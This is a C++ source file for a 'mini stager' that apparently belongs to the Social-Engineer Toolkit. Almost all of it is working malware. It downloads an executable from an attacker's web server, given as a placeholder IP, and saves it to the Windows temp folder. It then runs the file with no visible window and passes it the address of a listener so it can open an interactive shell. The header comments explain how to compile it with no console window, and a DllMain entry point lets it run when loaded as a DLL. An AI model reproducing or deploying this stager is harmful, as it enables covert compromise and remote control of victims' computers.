/*

SET MINI STAGER FOR THE SET INTERACTIVE SHELL C++
 
Just a heads up if your using Dev-C++ to compile this you will need to go into Project -> Project Options -> Parameters -> Linkers and add: -lWininet 

Also, in Dev-C++ you will need to go to "Tools -> Compiler Options -> Settings -> Linker then: "Do not create a console Window: Yes"

VARIABLES TO REPLACE: 
          
          XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX // name of the executable, will be random in SET
          MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM // this is the IP address of the SET web server
          SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS // IP ADDRESS of the SET interactive shell listener and PORT to the SET interactive shell listener

*/

#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <unistd.h>

int WINAPI GetData(HINTERNET hResource, LPBYTE& lpData, DWORD& pdwDataLength);

int main()
{
    // create a buffer for the temp directory path, technically if the path is longer then this there would be issues but this is a hack job :P
    char path[5000]; 
    char* tmpdir = getenv("TMP");
    if (!tmpdir)
	// grab the temp directory %TEMP% in Windows
        tmpdir = getenv("TEMP");
	// print our temp directory to our buffer we created 'path'
	sprintf(path, "%s\\XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", tmpdir);
        // used to do dynamic byte writing on the fly through SET, IP Address goes here with null byte terminator
	char* host = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"; 
	char* url = new char[2000]; // create a buffer for our replaced IP address
	sprintf(url,"http://%s/x", host); // should end up being http://ipaddressorhost/x
	LPCSTR userAgent = "The Social-Engineer Toolkit (SET)"; // SET doesn't care what your user-agent string is

	// start the internet connection and handle downloading the data
	HINTERNET hNet = InternetOpen(userAgent,
		PRE_CONFIG_INTERNET_ACCESS,
		NULL,
		INTERNET_INVALID_PORT_NUMBER,
		0);

	HINTERNET hUrl = InternetOpenUrl(hNet,
		url,
		NULL,
		0,
		INTERNET_FLAG_RELOAD,
		0);

	LPBYTE lpData = NULL;
	DWORD dwLength = 0;
	GetData(hUrl, lpData, dwLength);
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hNet);

	// Do something with the data in lpData here.
	// Size of data is in dwLength

	FILE *file;
	// write out a file to our temp directory, temp equals %TEMP%\x.exe
	file = fopen(path, "wb"); // write file
	// for the length of the file write out the binary data from our buffer
	for (DWORD i=0; i<dwLength;i++)
	{
		BYTE c = lpData[i];
		fputc(c, file);
	}      
	// close our file
	fclose(file);
	// clean up our binary data in the buffer
	delete[] lpData;

    chdir(tmpdir);
    // HERE WE START OUR MAIN PROCESS CREATION
    
    STARTUPINFO siStartupInfo; 
    PROCESS_INFORMATION piProcessInfo; 
    memset(&siStartupInfo, 0, sizeof(siStartupInfo)); 
    memset(&piProcessInfo, 0, sizeof(piProcessInfo)); 
    siStartupInfo.cb = sizeof(siStartupInfo); 
    int i = CreateProcess(NULL, _T("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartupInfo, &piProcessInfo);
}

int WINAPI GetData(HINTERNET hResource, LPBYTE& lpData, DWORD& pdwDataLength)
{
	LPBYTE lpBuf;       // buffer for the data
	DWORD dwSize;       // size of the data available
	DWORD  dwDownloaded; // size of the downloaded data
	DWORD  dwSizeSum=0;  // size of the data in the textbox
	LPBYTE lpHolding;    // buffer to merge the data and buffer

	// This loop handles reading the data.  
	do
	{
		// The call to InternetQueryDataAvailable determines the
		// amount of data available to download.
		if (!InternetQueryDataAvailable(hResource,&dwSize,0,0))
		{
			return FALSE;
		}
		else
		{
			if (dwSize == 0)
			{
				break;
			}

			// Allocate a buffer of the size returned by
			// InternetQueryDataAvailable.
			lpBuf = new BYTE[dwSize];

			// Read the data from the HINTERNET handle.
			if(!InternetReadFile(hResource,
				(LPVOID)lpBuf,
				dwSize,
				&dwDownloaded))
			{

				delete[] lpBuf;
				break;
			}
			else
			{
				// Allocate the holding buffer.
				lpHolding = new BYTE[dwSizeSum + dwDownloaded];

				// current holding buffer position
				size_t pos = 0;

				// Check if there has been any data written,
				// save it to holding then delete.
				if (dwSizeSum != 0)
				{
					memcpy(lpHolding, lpData, dwSizeSum);
					pos = dwSizeSum;
					delete[] lpData;
				}

				// concat downloaded data to holding buffer
				memcpy(lpHolding+pos, lpBuf, dwDownloaded);

				// save holding pointer to our return param
				lpData = lpHolding;

				// Add the size of the downloaded data to the 
				// data size.
				dwSizeSum = dwSizeSum + dwDownloaded;

				// remove temp download buffer
				delete[] lpBuf;
			}
		}  
	}  
	while(TRUE);

	 pdwDataLength = dwSizeSum;

	return TRUE;
}

// start our entry point for our executable
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
    // call our main function
    main();
	return 0;
}
